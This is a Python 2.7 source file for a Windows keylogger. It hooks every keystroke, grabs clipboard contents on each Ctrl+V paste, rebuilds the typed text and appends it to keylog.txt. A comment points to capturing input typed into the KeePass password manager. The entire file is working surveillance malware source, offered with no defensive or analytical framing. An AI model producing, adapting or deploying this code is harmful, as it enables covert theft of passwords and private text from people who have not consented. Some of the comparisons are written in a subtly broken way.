#!python2.7

import win32api 
import sys
import pythoncom, pyHook 
import win32clipboard

data = ""
towrite = ""
flag = 0

#activates every keyboard press
def KeyboardEvent(event):
	global data, flag

	#get key pressed
	key = event.Key
	if len(key) > 1:
		#if len > 1, then it's special.  add <> to mark it as such
		key = "<" + key + ">"

	#strange case where keepass uses random "Packets"
	#no idea how to fix this
	if key == "<Packet>":
		print("Packet found!")
		print ('Ascii:', event.Ascii, chr(event.Ascii))
		print ('Key:', event.Key)
		print ('KeyID:', event.KeyID)

	#append key to datastream
	data = data + key

	#handle clipboard pasting
	if key == "V":
		if data[-11:] == "<Lcontrol>V":
			win32clipboard.OpenClipboard()
			clipboard = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			data = data[:-11] + "<Paste>" + clipboard + "<Paste>"

	#parse keys to proper orientation after return
	#write to file 'keylog.txt'
	elif key == "<Return>":
		parseKeys()
		write()

def parseKeys():
	global data,towrite
	print ("Raw data: " + data)

	#init flags/counters
	result = ""
	flag = 0
	capNext = False
	buf = ""
	cursor = -1
	pasteflag = 0


	for char in data:
		#character to add to result
		addChar = char

		#handles special flags
		if char == "<":
			addChar = ""
			flag = 1
			buf = ""
		elif flag == 1:
			if char == ">":
				flag = 0
				#move cursor left or right
				if buf == "Left":
					addChar = ""
					cursor -= 1
				elif buf == "Right":
					addChar = ""
					cursor += 1
				elif buf == "Packet":
					addChar = "|"
				#capitalize next char
				elif buf == "Lshift" or buf == "Rshift":
					addChar = ""
					capNext = True
				elif buf == "Tab":
					towrite += result
					print(result)
					result = ""
					cursor = -1
					continue
				elif buf == "Paste":
					if pasteflag is 0:
						#allows pasted text to pass unchanged
						pasteflag = 1
						addChar = ""
					else:
						pasteflag = 0
						addChar = ""
				elif buf == "Oem_Comma":
					addChar = ','
				elif buf == "Oem_Period":
					addChar = '.'
				elif buf == "Oem_6":
					addChar = "]"
				elif buf == "Oem_4":
					addChar = "["
				elif buf == "Space":
					addChar = " "
				elif buf == "Oem_Minus":
					addChar = "-"
				elif buf == "Oem_Plus":
					addChar = "="
				elif buf == "Oem_5":
					addChar = "\\"
				elif buf == "Oem_3":
					addChar = "`"
				elif buf == "Oem_1":
					addChar = ";"
				elif buf == "Oem_7":
					addChar = "\'"
				elif buf == "Oem_2":
					addChar = "/"
				elif buf == "Return":
					print (result)
					towrite += result
					result = ""
					cursor = -1
					continue
				elif buf == "Lcontrol" or buf == "Lmenu" or buf == "Back" or buf == "Escape" or buf == "Lwin" or buf == "Down" or buf == "Up":
					addChar = ""
				else:
					addChar = ""
					print ("ERROR: " + buf)
			#add to buffer, not to result
			else:
				buf += char
				addChar = ""
		#add char to result
		if addChar != "":
			#move cursor position
			cursor += len(addChar)
			if pasteflag is 1:
				pass #allow text to passthrough unmodified
			#capitalize next character
			elif capNext:
				capNext = False
				addChar = toupper(addChar)
			#all chars are uppercase, so need to lower it
			else:
				addChar = addChar.lower()
			#add to result at cursor position
			result = result[:cursor] + addChar + result[cursor:]

def write():
	global data, towrite
	if len(data + towrite) > 100:
		file = open("keylog.txt", "a")
		file.write("\n" + data + "\n" + towrite + "\n----------\n")
		file.close()
		towrite = ""
		data = ""

#converts char to uppercase on keyboard
def toupper(char):
	if char is '1':
		return '!'
	elif char is '2':
		return '@'
	elif char is '3':
		return '#'
	elif char is '4':
		return '$'
	elif char is '5':
		return '%'
	elif char is '6':
		return '^'
	elif char is '7':
		return '&'
	elif char is '8':
		return '*'
	elif char is '9':
		return '('
	elif char is '0':
		return ')'
	elif char is '-':
		return '_'
	elif char is '=':
		return '+'
	elif char is '\\':
		return '|'
	elif char is '`':
		return '~'
	elif char is '[':
		return '{'
	elif char is ']':
		return '}'
	elif char is ';':
		return ':'
	elif char is '\'':
		return '"'
	elif char is ',':
		return '<'
	elif char is '.':
		return '>'
	elif char is '/':
		return '?'
	else:
		return char


hook = pyHook.HookManager()
hook.KeyDown = KeyboardEvent
hook.HookKeyboard()
#waits forever
pythoncom.PumpMessages()

# print ('MessageName:',event.MessageName)
# print ('Message:',event.Message)
# print ('Time:',event.Time)
# print ('Window:',event.Window)
# print ('WindowName:',event.WindowName)
# print ('Ascii:', event.Ascii, chr(event.Ascii))
# print ('Key:', event.Key)
# print ('KeyID:', event.KeyID)
# print ('ScanCode:', event.ScanCode)
# print ('Extended:', event.Extended)
# print ('Injected:', event.Injected)
# print ('Alt', event.Alt)
# print ('Transition', event.Transition)
# print ('---')